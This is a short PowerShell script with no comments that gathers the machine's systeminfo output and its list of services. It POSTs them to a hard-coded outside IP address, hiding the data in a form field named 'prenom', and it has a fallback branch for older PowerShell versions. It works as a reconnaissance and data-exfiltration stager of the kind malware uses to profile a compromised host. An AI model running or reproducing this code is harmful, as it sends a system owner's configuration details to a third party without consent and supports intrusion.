$Number = $Host.Version.Major


$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;
If ($Number -gt 4)
{
    $Body = @{prenom = $infos + $task};$LoginResponse = Invoke-WebRequest 'http://193.253.115.56/post.php' -SessionVariable 'Session' -Body $Body -Method 'POST'
}
else {    
    $Body = [byte[]][char[]]$infos;
    $Request = [System.Net.HttpWebRequest]::Create('http://193.253.115.56/post.php');
    $Request.Method = 'POST';
    $Stream = $Request.GetRequestStream();
    $Stream.Write($Body, 0, $Body.Length);
    $Request.GetResponse();
    $Stream.Close();
}